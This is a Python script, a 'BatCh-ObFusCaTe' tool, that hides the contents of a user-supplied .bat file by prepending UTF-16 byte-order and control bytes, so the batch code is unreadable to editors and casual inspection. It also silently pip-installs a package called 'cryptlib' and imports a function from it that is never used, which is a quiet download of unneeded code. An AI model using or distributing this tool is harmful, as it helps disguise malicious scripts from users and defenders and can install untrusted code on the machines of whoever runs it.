import subprocess
from pathlib import Path
import random,string, os
import platform
import termcolor
try:
    from pystyle import *
except:
    os.system("pip install pystyle")
    from pystyle import *
try:
    from tqdm import tqdm
except:
    os.system("pip install tqdm")
    from tqdm import tqdm
try:
    import colorama
except ImportError:
    os.system("pip install colorama")
    import colorama
try:
    from cryptlib import encstr
except ImportError:
    os.system("pip install cryptlib -q -q -q")
    from cryptlib import encstr
colorama.deinit()
banner = Center.XCenter("""
    ____       _____    _   _        ___  _     _____           ____     _____
   | __ )  __ |_   _|__| | | |      / _ \| |__ |  ___|   _ ___ / ___|__ |_   _|__
   |  _ \ / _  || |/ __| |_| |_____| | | |  _ \| |_ | | | / __| |   / _  || |/ _ \`
   | |_) | (_| || | (__|  _  |_____| |_| | |_) |  _|| |_| \__ \ |__| (_| || |  __/
   |____/ \__,_||_|\___|_| |_|      \___/|_ __/|_|   \__,_|___/\____\__,_||_|\___|
                            \n\n
""")
def os():
  iden = platform.system()
  if(iden == "Windows"):
    print("\033c")
    print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
    obfuscate2()
  else:
    print("\033c")
    print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
    obfuscate2()
def obfuscate2():
    S = 5
    ran = ''.join(random.choices(string.ascii_uppercase + string.digits, k=S))
    file = input(termcolor.colored("\nEnter Path Of BAT File:- ", 'green'))
    out_hex = []
    out_hex.extend(["FF", "FE", "26", "63", "6C", "73", "0D", "0A", "FF", "FE", "0A", "0D"])
    with open(f'{file}','rb') as f:
            penis = f.read()
    out_hex.extend(['{:02X}'.format(b) for b in penis])
    with open(f'{ran}.bat', 'wb') as f:
        for i in out_hex:
            f.write(bytes.fromhex(i))
    path_to_file = f'{ran}.bat'
    path = Path(path_to_file)
    if path.is_file():
        print(termcolor.colored('\n[ ✔ ] File Obfuscated Success...', 'cyan'))
    else:
        print(termcolor.colored('\n[ X ] Error Occured! Plz Run again',
                                'red'))
def catc():
    try:
      os()
    except KeyboardInterrupt:
      print("You Pressed The Exit Button!")
      quit()
catc()
